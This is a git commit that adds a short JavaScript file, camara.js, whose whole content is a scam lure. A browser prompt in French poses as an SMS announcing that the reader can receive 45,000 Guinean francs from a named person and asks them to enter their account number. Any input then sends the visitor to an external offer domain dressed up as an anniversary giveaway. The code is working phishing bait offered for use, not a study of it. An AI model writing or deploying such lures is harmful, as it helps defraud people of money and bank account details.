c0c20993fb4bc251fff1ed9cfbb31bcb32dc443e
Help-All <imaobongumoh637@gmail.com>
2026-08-09 23:04:25 +0100

    Create camara.js

---
+++ camara.js
@@ -0,0 +1,5 @@
+var password = 'RETIRER 45 000 FG'
+password=prompt('SMS : Félicitations, vous êtes éligible pour recevoir 45 000 FG de KERFALLA PERSON CAMARA, cliquez sur OK pour saisir votre numéro de compte','RETIRER 45 000 FG');
+if (password != 'RETIRER 45 000 FG') {
+location.href='https://getin-ofer.cfd/56th-Camara-Anniversaire.html';
+}
